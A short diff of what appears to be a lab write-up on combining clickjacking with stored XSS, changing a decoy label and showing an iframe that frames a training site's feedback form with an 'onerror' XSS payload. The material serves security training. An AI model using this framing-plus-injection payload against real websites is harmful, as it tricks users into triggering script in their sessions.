@@ -28,7 +28,7 @@ This lab demonstrates combining **Clickjacking with stored XSS** by framing the 
 		z-index: 1;
 	}
    </style>
-   <div>Test me</div>
+   <div>Click me</div>
    <iframe
    src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-          website.com&subject=test&message=test#feedbackResult"></iframe>
    ```
